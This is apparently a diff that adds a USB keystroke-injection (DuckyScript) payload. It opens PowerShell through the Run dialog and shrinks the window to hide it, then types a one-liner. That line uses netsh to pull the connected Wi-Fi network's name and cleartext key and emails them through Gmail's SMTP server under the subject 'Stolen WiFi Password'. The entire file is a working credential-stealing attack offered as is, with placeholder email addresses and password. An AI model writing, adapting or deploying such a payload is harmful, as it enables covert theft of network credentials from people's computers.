@@ -1,0 +1,14 @@
+DELAY 10000
+CONTROL w
+WINDOWS r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 500
+REM *** Hide PowerShell ***
+STRING [console]::WindowHeight=1;
+ENTER
+STRING [console]::WindowWidth=1;
+ENTER
+STRING $f="<from_email>";$t="<to_email>";$p="<password>";$_,$s=((netsh wlan show interface|findstr "Profile"|findstr /v "mode")-split":",2).trim();$_,$w=((netsh wlan show profile name=$s key=clear|findstr Key)-split":").trim();$i=New-Object Net.Mail.SmtpClient('smtp.gmail.com',587);$i.EnableSsl=$true;$i.Credentials=New-Object System.Net.NetworkCredential($f,$p);$e=New-Object System.Net.Mail.MailMessage;$e.From=$f;$e.To.Add($t);$e.Subject='Stolen WiFi Password';$e.Body="SSID: $s`r`nPassword: $w";$i.Send($e);exit;
+ENTER
